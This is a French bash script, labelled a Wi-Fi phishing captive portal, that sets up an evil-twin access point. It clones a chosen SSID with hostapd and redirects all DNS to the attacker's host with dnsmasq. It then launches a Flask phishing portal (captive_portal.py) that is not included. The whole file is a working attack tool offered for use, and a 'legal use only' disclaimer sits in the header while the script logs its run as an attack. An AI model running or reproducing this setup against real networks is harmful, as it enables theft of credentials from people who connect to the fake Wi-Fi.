#!/bin/bash
# ==================================================
# Script avancé - Portail Captif (Wi-Fi Phishing)
# Auteur: Levi | Usage Légal Uniquement
# ==================================================

LOGFILE="attack.log"
echo "[*] Démarrage du script..." > $LOGFILE

# Vérification root
if [ "$EUID" -ne 0 ]; then
  echo "[!] Lance ce script en root." | tee -a $LOGFILE
  exit 1
fi

# Vérification dépendances
for cmd in airmon-ng hostapd dnsmasq python3; do
  if ! command -v $cmd &> /dev/null; then
    echo "[!] $cmd manquant. Installe-le avant de continuer." | tee -a $LOGFILE
    exit 1
  fi
done

echo "[*] Détection des interfaces Wi-Fi..." | tee -a $LOGFILE
iw dev | grep Interface | awk '{print NR") "$2}'
read -p "Sélectionne le numéro de ton interface Wi-Fi: " num
iface=$(iw dev | grep Interface | awk '{print $2}' | sed -n "${num}p")

if [ -z "$iface" ]; then
  echo "[!] Interface non valide." | tee -a $LOGFILE
  exit 1
fi

read -p "Nom du SSID à cloner (ex: FreeWifi): " ssid
read -p "Canal (ex: 6): " channel

echo "[*] Activation mode monitor sur $iface" | tee -a $LOGFILE
airmon-ng start $iface

# Création config hostapd dynamique
cat > hostapd.conf <<EOF
interface=${iface}mon
driver=nl80211
ssid=$ssid
channel=$channel
EOF

echo "[*] Lancement du point d'accès..." | tee -a $LOGFILE
hostapd hostapd.conf &
HOSTAPD_PID=$!

sleep 3

echo "[*] Lancement dnsmasq..." | tee -a $LOGFILE
cat > dnsmasq.conf <<EOF
interface=${iface}mon
dhcp-range=192.168.1.2,192.168.1.20,255.255.255.0,24h
address=/#/192.168.1.1
EOF

dnsmasq -C dnsmasq.conf &
DNSMASQ_PID=$!

echo "[*] Lancement du portail captif Flask..." | tee -a $LOGFILE
python3 captive_portal.py &
FLASK_PID=$!

trap cleanup EXIT
cleanup() {
    echo "[*] Nettoyage..." | tee -a $LOGFILE
    kill $HOSTAPD_PID $DNSMASQ_PID $FLASK_PID
    airmon-ng stop ${iface}mon
    echo "[*] Fin de l'attaque." | tee -a $LOGFILE
}
wait
